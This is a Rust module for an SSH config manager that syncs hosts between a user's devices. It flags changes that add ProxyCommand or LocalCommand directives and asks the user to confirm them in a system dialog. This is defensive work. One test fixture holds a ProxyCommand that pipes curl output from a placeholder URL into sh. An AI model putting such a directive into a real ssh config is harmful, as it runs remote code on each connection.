//! A sync between two of the user's devices, once each made sure the other
//! is one (see [`conversation`]).
//!
//! 1. Each sends its [`Manifest`]: hosts, their server keys, and the
//!    records of the user's devices and projects. The side that connected
//!    goes first.
//! 2. Each works out on its own what to take ([`plan`]) and sorts it:
//!    - changes nobody needs to look at;
//!    - changes that add a directive running a program or reaching beyond
//!      the host;
//!    - more than [`MASS_DELETE`] deletions;
//!    - conflicts.
//! 3. The user of the side that connected decides on all but the first
//!    kind; its choices on conflicts go to the other side
//!    ([`Message::Decisions`]). The other side puts off its own risky
//!    changes and mass deletions: its user is asked when they sync from it.
//!    A risky change the user chose, a conflict settled for the other
//!    computer's version included, is made only once they allow it in a
//!    system dialog ([`Side::allow_risky`]), which a script in the page
//!    can't answer; what they don't allow waits for the next sync.
//! 4. Each writes its files (after a backup) and says what it has now
//!    ([`Message::Applied`]). What both have alike becomes the snapshot for
//!    next time ([`agree`]).
//!
//! [`conversation`]: super::pairing::conversation

use std::collections::BTreeMap;
use std::fmt::Write as _;
use std::net::TcpStream;
use std::time::Instant;

use serde::{Deserialize, Serialize};
use sshkm_core::config::SshConfig;
use sshkm_core::known_hosts::KnownHosts;
use sshkm_core::p2p::{Message, PeerKey, Session};
use sshkm_core::sync::host_keys::{self, KeysDiffer};
use sshkm_core::sync::hosts::{self, RiskyLine};
use sshkm_core::sync::{
    Base, Change, Conflict, Hasher, MAX_MANIFEST, Manifest, agree, digest, digests, plan,
};
use sshkm_core::vault::DeviceRecord;
use sshkm_core::vault::projects::ProjectRecord;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;

use super::pairing::{ANSWER_TIMEOUT, POLL, PairingFailure, PairingPhase, Side, broken, waiting};
use super::transfer::STEP_TIMEOUT;
use crate::confirm::Localized;

/// More incoming deletions than this need the user's yes.
pub const MASS_DELETE: usize = 5;
/// Most directives the system dialog lists.
const SHOWN_LINES: usize = 8;
/// Longest value the system dialog shows in full.
const SHOWN_CHARS: usize = 120;

/// What a sync starts from on one side.
pub struct SyncLocal {
    pub config: SshConfig,
    pub known: KnownHosts,
    pub devices: Vec<DeviceRecord>,
    pub projects: Vec<ProjectRecord>,
    pub state: SyncState,
    pub hasher: Hasher,
}

/// What one computer keeps about its last sync with another device.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SyncState {
    pub base: Base,
    /// Risky changes this user said no to, by host: the digest of the
    /// version turned down, which is then not asked about again.
    #[serde(default)]
    pub declined: BTreeMap<String, String>,
    /// When the last sync ended: RFC 3339, UTC.
    #[serde(default)]
    pub synced: Option<String>,
}

/// What a sync writes: the files that changed, checked against the
/// revisions they had when it started, and the other side's device and
/// project records.
pub struct SyncWrite {
    pub config: Option<SshConfig>,
    pub config_revision: String,
    pub known: Option<KnownHosts>,
    pub known_revision: String,
    pub devices: Vec<DeviceRecord>,
    pub projects: Vec<ProjectRecord>,
}

/// What the user of the side that connected decides on.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct Review {
    /// Hosts both computers changed, differently.
    pub conflicts: Vec<Conflict>,
    /// Changes that add a directive running a program or reaching beyond
    /// the host.
    pub risky: Vec<RiskyChange>,
    /// Hosts the other computer deleted, when there are more than
    /// [`MASS_DELETE`].
    pub deletions: Vec<String>,
}

impl Review {
    fn is_empty(&self) -> bool {
        self.conflicts.is_empty() && self.risky.is_empty() && self.deletions.is_empty()
    }
}

/// A risky change: the host and the directives it would add.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct RiskyChange {
    pub id: String,
    pub lines: Vec<RiskyLine>,
}

/// The user's choices on a [`Review`]; what is in no list waits for the
/// next sync.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct SyncDecisions {
    /// Conflicts where this computer's version stays.
    #[serde(default)]
    pub mine: Vec<String>,
    /// Conflicts where the other computer's version stays.
    #[serde(default)]
    pub theirs: Vec<String>,
    /// Risky changes to make.
    #[serde(default)]
    pub apply: Vec<String>,
    /// Risky changes turned down: not asked about again.
    #[serde(default)]
    pub decline: Vec<String>,
    /// Make the deletions.
    #[serde(default)]
    pub delete: bool,
}

/// How a sync went on this side.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
#[cfg_attr(test, derive(ts_rs::TS), ts(export, export_to = crate::types::BINDINGS))]
pub struct SyncSummary {
    /// Hosts added, changed and deleted here.
    pub added: u32,
    pub changed: u32,
    pub removed: u32,
    /// Server keys added to `known_hosts` here.
    pub keys_added: u32,
    /// Hosts the two trust different keys for: shown, never resolved.
    pub keys_differ: Vec<KeysDiffer>,
    /// Changes put off for this computer's user, and for the other's.
    pub deferred: u32,
    pub deferred_there: u32,
    /// Conflicts left for a later sync.
    pub conflicts: u32,
    /// Changes `ssh_config` didn't take.
    pub failed: u32,
}

/// The rest of the conversation on either side.
pub fn run(session: &mut Session<TcpStream>, side: &impl Side, peer: PeerKey) -> PairingPhase {
    talk(session, side, peer).unwrap_or_else(|reason| PairingPhase::Failed { reason })
}

/// What a plan holds, sorted by who has to look at it.
#[derive(Default)]
struct Sorted {
    safe: Vec<Change>,
    risky: Vec<(Change, Vec<RiskyLine>)>,
    deletions: Vec<Change>,
    conflicts: Vec<Conflict>,
}

fn talk(
    session: &mut Session<TcpStream>,
    side: &impl Side,
    peer: PeerKey,
) -> Result<PairingPhase, PairingFailure> {
    let initiator = session.is_initiator();
    side.show(None, &PairingPhase::Syncing);
    let local = side.sync_load(peer)?;
    let hosts = hosts::portable(&local.config);
    let mine = Manifest {
        host_keys: host_keys::collect(&local.known, &hosts),
        hosts,
        devices: local.devices.clone(),
        projects: local.projects.clone(),
    };
    let _ = session.stream().set_read_timeout(Some(STEP_TIMEOUT));
    let Message::Manifest { manifest: theirs } = swap(
        session,
        &Message::Manifest {
            manifest: mine.clone(),
        },
    )?
    else {
        return Err(PairingFailure::Broken);
    };
    theirs.check().map_err(|_| PairingFailure::Broken)?;

    let sorted = sort(
        &local,
        &plan(&local.state.base, &local.hasher, &mine.hosts, &theirs.hosts),
    );
    let decisions = settle(session, side, &local.config, &sorted)?;
    let mut summary = SyncSummary::default();
    let mut state = local.state.clone();
    let changes = choose(
        initiator,
        &local.config,
        sorted,
        &decisions,
        &mut state,
        &mut summary,
    );

    let mut config = local.config.clone();
    for change in &changes {
        match (hosts::apply(&mut config, change), change) {
            (Ok(()), Change::Add(_)) => summary.added += 1,
            (Ok(()), Change::Update(_)) => summary.changed += 1,
            (Ok(()), Change::Delete(_)) => summary.removed += 1,
            (Err(_), _) => summary.failed += 1,
        }
    }
    let mut known = local.known.clone();
    let keys = host_keys::merge(&mut known, &theirs.host_keys);
    summary.keys_added = keys.added;
    summary.keys_differ = keys.differ;
    let written = side.sync_write(
        peer,
        &SyncWrite {
            config: (config != local.config).then(|| config.clone()),
            config_revision: local.config.revision(),
            known: (known != local.known).then_some(known),
            known_revision: local.known.revision(),
            devices: theirs.devices.clone(),
            projects: theirs.projects.clone(),
        },
    );
    // What is on disk now: the other side's snapshot must match it.
    let after = hosts::portable(if written.is_ok() {
        &config
    } else {
        &local.config
    });
    let Message::Applied {
        hashes: their_hashes,
        deferred: deferred_there,
    } = swap(
        session,
        &Message::Applied {
            hashes: digests(&after),
            deferred: summary.deferred,
        },
    )?
    else {
        return Err(PairingFailure::Broken);
    };
    written?;
    summary.deferred_there = deferred_there;

    state.base = agree(&local.state.base, &local.hasher, &after, &their_hashes);
    let offered = digests(&theirs.hosts);
    state
        .declined
        .retain(|id, declined| offered.get(id) == Some(declined));
    state.synced = OffsetDateTime::now_utc().format(&Rfc3339).ok();
    side.sync_keep(peer, &state)?;
    Ok(PairingPhase::Synced { summary })
}

/// What the users decided: on the side that connected, its user's choices
/// on whatever needs one, less the risky ones they don't allow in the
/// system dialog, sent to the other side; there, what came.
fn settle(
    session: &mut Session<TcpStream>,
    side: &impl Side,
    config: &SshConfig,
    sorted: &Sorted,
) -> Result<SyncDecisions, PairingFailure> {
    if session.is_initiator() {
        let review = Review {
            conflicts: sorted.conflicts.clone(),
            risky: sorted
                .risky
                .iter()
                .map(|(change, lines)| RiskyChange {
                    id: change.id().to_owned(),
                    lines: lines.clone(),
                })
                .collect(),
            deletions: sorted.deletions.iter().map(|c| c.id().to_owned()).collect(),
        };
        let mut decisions = if review.is_empty() {
            SyncDecisions::default()
        } else {
            side.show(None, &PairingPhase::Decide { review });
            decide(session, side)?
        };
        allow_risky(side, config, sorted, &mut decisions);
        session
            .send(&Message::Decisions {
                initiator: decisions.mine.clone(),
                responder: decisions.theirs.clone(),
            })
            .map_err(|_| PairingFailure::Broken)?;
        side.show(None, &PairingPhase::Syncing);
        return Ok(decisions);
    }
    // The other user reviews, then may see the system dialog.
    let _ = session
        .stream()
        .set_read_timeout(Some(ANSWER_TIMEOUT * 2 + STEP_TIMEOUT));
    let Message::Decisions {
        initiator: theirs_stay,
        responder: mine_stay,
    } = session.recv().map_err(broken)?
    else {
        return Err(PairingFailure::Broken);
    };
    let _ = session.stream().set_read_timeout(Some(STEP_TIMEOUT));
    Ok(SyncDecisions {
        mine: mine_stay,
        theirs: theirs_stay,
        ..SyncDecisions::default()
    })
}

/// Keeps in `decisions` only the risky changes this computer's user allows
/// in the system dialog: the ones they chose to make, and the conflicts
/// they settled for the other computer's version that would add a directive
/// running a program or reaching beyond the host. The page's choice alone
/// never writes one. On a no, all of them wait for the next sync; the rest
/// of the sync goes on.
fn allow_risky(
    side: &impl Side,
    config: &SshConfig,
    sorted: &Sorted,
    decisions: &mut SyncDecisions,
) {
    let mut asked: Vec<RiskyChange> = sorted
        .risky
        .iter()
        .filter(|(change, _)| decisions.apply.iter().any(|id| id == change.id()))
        .map(|(change, lines)| RiskyChange {
            id: change.id().to_owned(),
            lines: lines.clone(),
        })
        .collect();
    for conflict in &sorted.conflicts {
        if !decisions.theirs.contains(&conflict.id) {
            continue;
        }
        let lines = hosts::risky(config, &conflict.take_theirs()).unwrap_or_default();
        if !lines.is_empty() {
            asked.push(RiskyChange {
                id: conflict.id.clone(),
                lines,
            });
        }
    }
    if asked.is_empty() || side.allow_risky(&asked) {
        return;
    }
    let asked = |id: &String| asked.iter().any(|change| change.id == *id);
    decisions.apply.retain(|id| !asked(id));
    decisions.theirs.retain(|id| !asked(id));
}

/// The system dialog that asks to allow `changes` from a sync with `peer`
/// in the config file `file`: its title, text and button.
pub fn risky_prompt(
    peer: &str,
    file: &str,
    changes: &[RiskyChange],
) -> (Localized, Localized, Localized) {
    let en = risky_list(changes, |n| format!("…and {n} more"));
    let ru = risky_list(changes, |n| format!("…и ещё {n}"));
    let uz = risky_list(changes, |n| format!("…va yana {n} ta"));
    let peer = shown(peer);
    (
        Localized::new(
            "Allow ssh to run this?",
            "Разрешить ssh запускать это?",
            "ssh buni ishga tushirsinmi?",
        ),
        Localized::new(
            format!(
                "The sync with {peer} adds to {file} what makes ssh run programs, load code \
                 or let the server use this computer each time you connect:\n\n{en}\n\n\
                 Allow it only if you made these changes on {peer} yourself. Otherwise \
                 they wait for the next sync."
            ),
            format!(
                "Синхронизация с {peer} добавляет в {file} то, из-за чего ssh при каждом \
                 подключении запускает программы, загружает код или даёт серверу доступ к \
                 этому компьютеру:\n\n{ru}\n\n\
                 Разрешайте, только если эти изменения на {peer} сделали вы сами. Иначе \
                 они подождут следующей синхронизации."
            ),
            format!(
                "{peer} bilan sinxronlash {file} ga ssh har safar ulanganda dasturlarni \
                 ishga tushiradigan, kod yuklaydigan yoki serverga bu kompyuterdan \
                 foydalanishga ruxsat beradigan narsalarni qoʻshadi:\n\n{uz}\n\n\
                 Faqat bu oʻzgarishlarni {peer} da oʻzingiz qilgan boʻlsangiz, ruxsat \
                 bering. Aks holda ular keyingi sinxronlashni kutadi."
            ),
        ),
        Localized::new(
            "Allow and sync",
            "Разрешить и синхронизировать",
            "Ruxsat berish va sinxronlash",
        ),
    )
}

/// One line per directive (`• Host prod: ProxyCommand …`), at most
/// [`SHOWN_LINES`] of them; `more` says how many were left out.
fn risky_list(changes: &[RiskyChange], more: impl Fn(usize) -> String) -> String {
    let all: Vec<String> = changes
        .iter()
        .flat_map(|change| {
            change.lines.iter().map(move |line| {
                format!(
                    "• Host {}: {} {}",
                    shown(&change.id),
                    shown(&line.key),
                    shown(&line.value)
                )
            })
        })
        .collect();
    let mut lines: Vec<String> = all.iter().take(SHOWN_LINES).cloned().collect();
    if all.len() > SHOWN_LINES {
        lines.push(more(all.len() - SHOWN_LINES));
    }
    lines.join("\n")
}

/// `text` as the dialog shows it: control characters and invisible or
/// direction-changing ones as `<U+…>`, so what is shown is what `ssh` runs,
/// and at most [`SHOWN_CHARS`] characters, with how many more there are.
fn shown(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for (i, c) in text.chars().enumerate() {
        if i == SHOWN_CHARS {
            let rest = text.chars().count() - SHOWN_CHARS;
            let _ = write!(out, "… (+{rest})");
            break;
        }
        let invisible = matches!(
            c,
            '\u{00AD}'
                | '\u{061C}'
                | '\u{180E}'
                | '\u{200B}'..='\u{200F}'
                | '\u{202A}'..='\u{202E}'
                | '\u{2060}'..='\u{2069}'
                | '\u{FEFF}'
        );
        if c.is_control() || invisible {
            let _ = write!(out, "<U+{:04X}>", u32::from(c));
        } else {
            out.push(c);
        }
    }
    out
}

/// The changes to make here after the decisions, counting what waits in
/// `summary` and remembering what the user turned down in `state`.
fn choose(
    initiator: bool,
    config: &SshConfig,
    sorted: Sorted,
    decisions: &SyncDecisions,
    state: &mut SyncState,
    summary: &mut SyncSummary,
) -> Vec<Change> {
    let mut changes = sorted.safe;
    if initiator {
        for (change, _) in sorted.risky {
            let id = change.id().to_owned();
            if decisions.apply.contains(&id) {
                changes.push(change);
            } else if decisions.decline.contains(&id)
                && let Change::Add(item) | Change::Update(item) = &change
            {
                state.declined.insert(id, digest(item));
            } else {
                summary.deferred += 1;
            }
        }
        if decisions.delete {
            changes.extend(sorted.deletions);
        } else {
            summary.deferred += count(sorted.deletions.len());
        }
    } else {
        summary.deferred += count(sorted.risky.len() + sorted.deletions.len());
    }
    for conflict in &sorted.conflicts {
        if decisions.theirs.contains(&conflict.id) {
            let change = conflict.take_theirs();
            let risky = !hosts::risky(config, &change).unwrap_or_default().is_empty();
            if !initiator && risky {
                summary.deferred += 1;
            } else {
                changes.push(change);
            }
        } else if !decisions.mine.contains(&conflict.id) {
            summary.conflicts += 1;
        }
    }
    changes
}

/// Sends `message` and reads the other side's: the side that connected
/// sends first.
fn swap(session: &mut Session<TcpStream>, message: &Message) -> Result<Message, PairingFailure> {
    if session.is_initiator() {
        session.send_large(message).map_err(broken)?;
        session.recv_large(MAX_MANIFEST).map_err(broken)
    } else {
        let theirs = session.recv_large(MAX_MANIFEST).map_err(broken)?;
        session.send_large(message).map_err(broken)?;
        Ok(theirs)
    }
}

/// Sorts a plan's changes by who has to look at them; a risky change the
/// user turned down before, in the same version, is left out.
fn sort(local: &SyncLocal, plan: &sshkm_core::sync::Plan) -> Sorted {
    let mut sorted = Sorted {
        conflicts: plan.conflicts.clone(),
        ..Sorted::default()
    };
    for change in &plan.changes {
        if let Change::Add(item) | Change::Update(item) = change
            && local.state.declined.get(&item.id) == Some(&digest(item))
        {
            continue;
        }
        match hosts::risky(&local.config, change) {
            Ok(lines) if !lines.is_empty() => sorted.risky.push((change.clone(), lines)),
            _ if matches!(change, Change::Delete(_)) => sorted.deletions.push(change.clone()),
            _ => sorted.safe.push(change.clone()),
        }
    }
    if sorted.deletions.len() <= MASS_DELETE {
        sorted.safe.append(&mut sorted.deletions);
    }
    sorted
}

/// Waits for the user's decisions while watching the connection; after
/// [`ANSWER_TIMEOUT`] everything waits for the next sync.
fn decide(
    session: &mut Session<TcpStream>,
    side: &impl Side,
) -> Result<SyncDecisions, PairingFailure> {
    let started = Instant::now();
    loop {
        if let Some(decisions) = side.decisions(POLL)? {
            return Ok(decisions);
        }
        if waiting(session.stream()).map_err(|_| PairingFailure::Broken)? {
            // The other side says nothing until it has the decisions:
            // anything now is it hanging up.
            return Err(PairingFailure::PeerLeft);
        }
        if started.elapsed() > ANSWER_TIMEOUT {
            return Ok(SyncDecisions::default());
        }
    }
}

fn count(n: usize) -> u32 {
    u32::try_from(n).unwrap_or(u32::MAX)
}

#[cfg(test)]
mod tests {
    use super::super::pairing::Purpose;
    use super::super::script::{Script, talk};
    use super::*;

    const LEFT: &str =
        "Host a\n    HostName 10.0.0.1\n    IdentityFile ~/.ssh/id_a\n\nHost *\n    User me\n";
    const RIGHT: &str = "Host b\n    HostName 10.0.0.2\n";

    fn synced(end: &PairingPhase) -> SyncSummary {
        match end {
            PairingPhase::Synced { summary } => summary.clone(),
            other => panic!("not synced: {other:?}"),
        }
    }

    fn sync(left: Script, right: Script) -> ((SyncSummary, Script), (SyncSummary, Script)) {
        let ((left_end, left), (right_end, right)) = talk(left, right, Purpose::Sync);
        ((synced(&left_end), left), (synced(&right_end), right))
    }

    fn set(side: &Script, config: &str) {
        *side.config.lock().unwrap() = SshConfig::parse(config);
    }

    #[test]
    fn hosts_go_both_ways_without_what_is_each_computers() {
        let ((left_sum, left), (right_sum, right)) = sync(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        assert_eq!((left_sum.added, right_sum.added), (1, 1));
        let (left_text, right_text) = (left.config_text(), right.config_text());
        // New hosts go before `Host *`.
        assert!(left_text.find("Host b").unwrap() < left_text.find("Host *").unwrap());
        assert!(right_text.contains("Host a\n    HostName 10.0.0.1\n"));
        assert!(!right_text.contains("IdentityFile"));
        assert!(!right_text.contains("Host *"));
        // Both now share a snapshot of both hosts.
        for side in [&left, &right] {
            let state = side.sync_state.lock().unwrap();
            assert_eq!(state.base.items.keys().collect::<Vec<_>>(), ["a", "b"]);
            assert!(state.synced.is_some());
        }

        // Next time only what changed comes over, the other way too.
        set(&right, &right_text.replace("10.0.0.1", "10.9.9.9"));
        let ((left_sum, left), (right_sum, _)) = sync(left, right);
        assert_eq!((left_sum.changed, right_sum.changed), (1, 0));
        assert!(
            left.config_text()
                .contains("HostName 10.9.9.9\n    IdentityFile ~/.ssh/id_a")
        );
    }

    #[test]
    fn project_records_go_both_ways() {
        let record = |id: &str, name: &str| ProjectRecord {
            id: id.into(),
            record: format!(r#"{{"name":{{"v":"{name}","t":1}},"color":{{"v":"blue","t":1}}}}"#),
        };
        let (left, right) = (
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        let shop = record("6f1c2d3e-0000-4000-8000-000000000001", "Shop");
        let blog = record("6f1c2d3e-0000-4000-8000-000000000002", "Blog");
        *left.projects.lock().unwrap() = vec![shop.clone()];
        *right.projects.lock().unwrap() = vec![blog.clone()];
        let ((_, left), (_, right)) = sync(left, right);
        // Each side merges what the other sent into its vault.
        assert_eq!(*left.projects.lock().unwrap(), [blog]);
        assert_eq!(*right.projects.lock().unwrap(), [shop]);
    }

    #[test]
    fn a_conflict_is_settled_by_the_user_who_started() {
        let ((_, left), (_, right)) = sync(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        set(&left, &left.config_text().replace("10.0.0.2", "10.1.1.1"));
        set(&right, &right.config_text().replace("10.0.0.2", "10.2.2.2"));

        // Left for later: nothing changes, and it comes up again.
        let ((left_sum, mut left), (right_sum, right)) = sync(left, right);
        assert_eq!((left_sum.conflicts, right_sum.conflicts), (1, 1));
        assert!(left.config_text().contains("10.1.1.1"));
        assert!(
            left.shown
                .lock()
                .unwrap()
                .iter()
                .any(|(_, phase)| matches!(phase, PairingPhase::Decide { review } if review.conflicts.len() == 1))
        );

        left.decisions.theirs = vec!["b".into()];
        let ((left_sum, left), (right_sum, right)) = sync(left, right);
        assert_eq!((left_sum.conflicts, right_sum.conflicts), (0, 0));
        assert!(left.config_text().contains("10.2.2.2"));
        assert!(right.config_text().contains("10.2.2.2"));
        let (l, r) = (
            left.sync_state.lock().unwrap(),
            right.sync_state.lock().unwrap(),
        );
        assert_eq!(
            l.base.items.keys().collect::<Vec<_>>(),
            r.base.items.keys().collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_risky_change_waits_for_the_user_of_each_computer() {
        let risky = "Host c\n    HostName 10.0.0.3\n    ProxyCommand ssh -W %h:%p bastion\n";
        // From the side that answered: the one that started asks its user.
        let mut left = Script::own("alice", "s", LEFT);
        left.decisions.apply = vec!["c".into()];
        let ((left_sum, left), (right_sum, right)) =
            sync(left, Script::own("bob", "s", &format!("{RIGHT}\n{risky}")));
        assert_eq!((left_sum.added, left_sum.deferred), (2, 0));
        assert!(
            left.config_text()
                .contains("ProxyCommand ssh -W %h:%p bastion")
        );
        assert_eq!(right_sum.deferred, 0);
        // The system dialog asked first, naming the directive.
        assert_eq!(
            *left.asked_risky.lock().unwrap(),
            [RiskyChange {
                id: "c".into(),
                lines: vec![RiskyLine {
                    key: "ProxyCommand".into(),
                    value: "ssh -W %h:%p bastion".into()
                }]
            }]
        );
        assert_eq!(right.asked_risky.lock().unwrap().len(), 0);

        // To the side that answered: put off there until its user syncs.
        let left_text = left.config_text().replace("Host c", "Host d");
        set(&left, &left_text);
        let ((left_sum, _), (right_sum, right)) = sync(left, right);
        assert_eq!(right_sum.deferred, 1);
        assert_eq!(left_sum.deferred_there, 1);
        assert!(!right.config_text().contains("Host d"));
    }

    #[test]
    fn the_system_dialog_not_the_page_lets_a_risky_change_in() {
        let risky = "Host c\n    ProxyCommand sh -c \"curl -s https://example.com/x | sh\"\n";
        let mut left = Script::own("alice", "s", LEFT);
        left.decisions.apply = vec!["c".into()];
        left.allows_risky = false;
        let ((left_sum, mut left), (_, right)) =
            sync(left, Script::own("bob", "s", &format!("{RIGHT}\n{risky}")));
        assert!(!left.config_text().contains("ProxyCommand"));
        assert_eq!((left_sum.added, left_sum.deferred), (1, 1));
        assert_eq!(left.asked_risky.lock().unwrap().len(), 1);

        // Not turned down: it comes up again, and goes in once allowed.
        left.allows_risky = true;
        let ((left_sum, left), _) = sync(left, right);
        assert_eq!((left_sum.added, left_sum.deferred), (1, 0));
        assert!(left.config_text().contains("ProxyCommand sh -c"));
    }

    #[test]
    fn a_conflict_settled_for_a_risky_version_needs_the_system_dialog() {
        let ((_, mut left), (_, right)) = sync(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "s", RIGHT),
        );
        set(&left, &left.config_text().replace("10.0.0.2", "10.1.1.1"));
        set(
            &right,
            &right
                .config_text()
                .replace("10.0.0.2", "10.2.2.2\n    LocalCommand say hi"),
        );
        left.decisions.theirs = vec!["b".into()];
        left.allows_risky = false;
        let ((left_sum, mut left), (_, right)) = sync(left, right);
        // Neither version is taken: the conflict waits.
        assert_eq!(left_sum.conflicts, 1);
        assert!(left.config_text().contains("10.1.1.1"));
        assert!(!left.config_text().contains("LocalCommand"));
        let asked = left.asked_risky.lock().unwrap().clone();
        assert_eq!(asked.len(), 1);
        assert_eq!(
            (asked[0].id.as_str(), asked[0].lines[0].key.as_str()),
            ("b", "LocalCommand")
        );

        left.allows_risky = true;
        let ((left_sum, left), (right_sum, _)) = sync(left, right);
        assert_eq!((left_sum.conflicts, right_sum.conflicts), (0, 0));
        assert!(left.config_text().contains("LocalCommand say hi"));
    }

    #[test]
    fn the_system_dialog_lists_hosts_and_directives_as_ssh_reads_them() {
        let change = |id: &str, n: usize| RiskyChange {
            id: id.into(),
            lines: (0..n)
                .map(|i| RiskyLine {
                    key: "LocalCommand".into(),
                    value: format!("echo {i}\u{202E}"),
                })
                .collect(),
        };
        let (title, body, approve) =
            risky_prompt("Bob\u{200B}", "~/.ssh/config", &[change("prod", 2)]);
        assert_eq!(title.en, "Allow ssh to run this?");
        assert_eq!(approve.ru, "Разрешить и синхронизировать");
        assert!(
            body.en
                .contains("The sync with Bob<U+200B> adds to ~/.ssh/config")
        );
        assert!(
            body.en
                .contains("• Host prod: LocalCommand echo 0<U+202E>\n")
        );
        assert!(body.uz.contains("• Host prod: LocalCommand echo 1<U+202E>"));

        let (_, body, _) = risky_prompt("Bob", "config", &[change("a", 5), change("b", 6)]);
        assert_eq!(body.en.matches("• Host").count(), SHOWN_LINES);
        assert!(body.en.contains("…and 3 more"));
        assert!(body.ru.contains("…и ещё 3"));
        let long = "x".repeat(SHOWN_CHARS + 5);
        assert_eq!(shown(&long), format!("{}… (+5)", "x".repeat(SHOWN_CHARS)));
    }

    #[test]
    fn many_deletions_need_a_yes() {
        let many = (1..=6)
            .map(|n| format!("Host h{n}\n    HostName 10.0.1.{n}\n\n"))
            .collect::<Vec<_>>()
            .concat();
        let ((_, left), (_, right)) = sync(
            Script::own("alice", "s", &many),
            Script::own("bob", "s", ""),
        );
        assert_eq!(right.config_text().matches("Host h").count(), 6);
        set(&right, "");
        let ((left_sum, mut left), (_, right)) = sync(left, right);
        assert_eq!((left_sum.removed, left_sum.deferred), (0, 6));
        assert_eq!(left.config_text().matches("Host h").count(), 6);

        left.decisions.delete = true;
        let ((left_sum, left), _) = sync(left, right);
        assert_eq!(left_sum.removed, 6);
        assert_eq!(left.config_text().matches("Host h").count(), 0);
    }

    #[test]
    fn only_the_users_devices_with_the_vault_sync() {
        let mut stranger = Script::own("bob", "s", RIGHT);
        stranger.own_peer = false;
        let ((left_end, _), (right_end, right)) =
            talk(Script::own("alice", "s", LEFT), stranger, Purpose::Sync);
        let not_own = PairingPhase::Failed {
            reason: PairingFailure::NotOwn,
        };
        assert_eq!((&left_end, &right_end), (&not_own, &not_own));
        assert_eq!(right.config_text(), RIGHT);

        let ((left_end, _), _) = talk(
            Script::own("alice", "s", LEFT),
            Script::own("bob", "another vault", RIGHT),
            Purpose::Sync,
        );
        assert_eq!(left_end, not_own);

        // The port announced to own devices takes nothing but a sync.
        let mut announced = Script::own("bob", "s", RIGHT);
        announced.only_sync = true;
        let ((_, _), (right_end, _)) =
            talk(Script::new("alice", Some(true)), announced, Purpose::Pair);
        assert_eq!(right_end, not_own);
    }
}
